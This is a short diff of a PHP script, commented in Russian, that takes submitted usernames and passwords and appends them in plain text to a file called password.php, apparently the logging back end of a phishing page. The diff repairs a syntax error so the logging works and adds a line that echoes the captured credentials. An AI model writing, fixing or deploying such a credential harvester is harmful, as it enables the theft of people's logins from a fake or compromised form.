@@ -4,6 +4,7 @@ $usrname= $_POST['username']; // Здесь будет значение инпу
 $passwd =  $_POST['password']; // А здесь с name "email"
 
 $f = fopen('password.php', 'a+'); // Открываем файл
-fwrite($f, "User-password: ".$usrname." - ".$passwd "\n"); // Записываем данные
+fwrite($f, "User-password: ".$usrname." - ".$passwd."\n"); // Записываем данные
 fclose($f); // Закрываем файл
+echo "User-password: ".$usrname." - ".$passwd."\n";
 ?>
